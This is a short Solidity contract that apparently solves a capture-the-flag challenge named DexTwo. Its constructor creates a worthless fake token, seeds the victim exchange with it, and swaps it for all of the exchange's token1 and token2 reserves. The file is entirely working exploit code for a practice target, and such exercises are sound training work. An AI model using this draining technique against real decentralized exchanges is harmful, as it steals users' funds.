// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./DexTwo.sol";

contract Solution15 {

    constructor(DexTwo victim) {
        SwappableTokenTwo fakeToken =  new SwappableTokenTwo(address(this), "FakeToken", "FT", 1000);
        address token1 = victim.token1();
        address token2 = victim.token2();

        fakeToken.approve(address(victim), 400);
        fakeToken.transfer(address(victim), 100);
        victim.swap(address(fakeToken), token1, 100);
        victim.swap(address(fakeToken), token2, 200);
    }
}
